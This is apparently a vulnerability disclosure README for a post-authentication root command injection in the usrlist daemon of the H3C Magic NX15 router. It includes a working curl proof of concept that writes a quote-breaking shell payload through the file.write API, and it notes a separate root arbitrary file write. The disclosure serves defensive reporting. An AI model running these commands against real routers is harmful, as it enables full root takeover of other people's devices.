# Post-auth Root RCE via `usrlist` command injection

## Submission Type

- Category: CVE
- Language: English
- Product: H3C Magic NX15 Router
- Affected firmware: NX15V100R017 / R017
- Main report: `report/postauth_usrlist_cmdi_root_rce_report.md`
- PoC: `poc/postauth_usrlist_cmdi_root_rce.py`

## Classification

This issue is classified as CVE because it is an authenticated command injection
in a native daemon (`/usr/bin/usrlist`), reachable through the `/api/esps`
`file.write` RPC method. The injected command is executed with **root**
privileges, and the parent process was positively identified as `usrlist` via
`/proc/<pid>/stat`.

## Summary

`/usr/bin/usrlist` reads `/var/run/agentlist` line by line and interpolates each
line, without escaping, into a shell command built with the format string
`cat %s | grep -E "%s" | awk '{print $3}'` (`0x41ED98`) before calling
`popen()` (`0x416D2C`). The untrusted value is placed **inside a pair of double
quotes**, so a single `"` character in a line closes the quoting and lets an
attacker append arbitrary shell commands.

`usrlist` reads the file from a 1-second timer callback, so once the file is
poisoned the command executes automatically and repeatedly — no further
interaction is required.

## Delivery primitive

The line is delivered through the `/api/esps` method `file.write`. Note that
`file.write` is **itself a root arbitrary file write** (no path validation, runs
in `rpcd` as root) and is reported separately as `../file_write_root_rce/`. It is
the *delivery primitive* for this finding, not a prerequisite vulnerability:
neither issue requires the other.

`file.write` was used here only because `/var/run/agentlist` does not exist by
default and therefore has to be created first.

## Reproduction

See `report/` for the full analysis, and `poc/` for a runnable script.

```bash
T=$(curl -s -X POST -H 'Content-Type: application/json' \
      -d '{"username":"H3C","password":"<admin>"}' \
      http://<target>/api/login/auth | sed -n 's/.*"session":"\([^"]*\)".*/\1/p')

curl -s -X POST -H 'Content-Type: application/json' -H "AUTHENTICATION: $T" \
  -d '[{"id":1,"object":"file","method":"write","param":{"path":"/var/run/agentlist","data":"x\";id>/www/download/poc.txt;echo \"y\n"}}]' \
  http://<target>/api/esps
sleep 9
curl -s http://<target>/download/poc.txt
# => uid=0(root) gid=0(root)
```

## Metrics

```text
CWE-78   Improper Neutralization of Special Elements used in an OS Command
CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H   (7.2)
```

## Notes

Control-flow hijacking is **not** claimed for this issue. The related stack
buffer overflow in the same function is reported separately as a denial of
service (`usrlist_stack_overflow_dos`); please see that report for why remote
code execution was not demonstrated.

Companion analysis: the sibling directories in this repository.
